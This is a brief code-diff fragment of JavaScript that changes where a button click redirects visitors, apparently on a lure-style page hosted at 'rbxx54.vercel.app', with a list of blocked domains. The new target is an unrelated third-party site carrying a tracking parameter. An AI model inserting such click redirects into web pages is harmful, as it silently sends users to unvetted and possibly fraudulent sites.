@@ -351,7 +351,7 @@ var button = document.querySelector('.btn');
 button.addEventListener('click', function() {
     (function() {
         var originalDomain = "rbxx54.vercel.app";
-        var redirectURL = "https://www.rolls3.com";
+        var redirectURL = "https://live33.online/?0cdda79";
         var blockedDomains = [
             "rbxx54.vercel.app/",
             "mply.io.4a6b8dh.site"
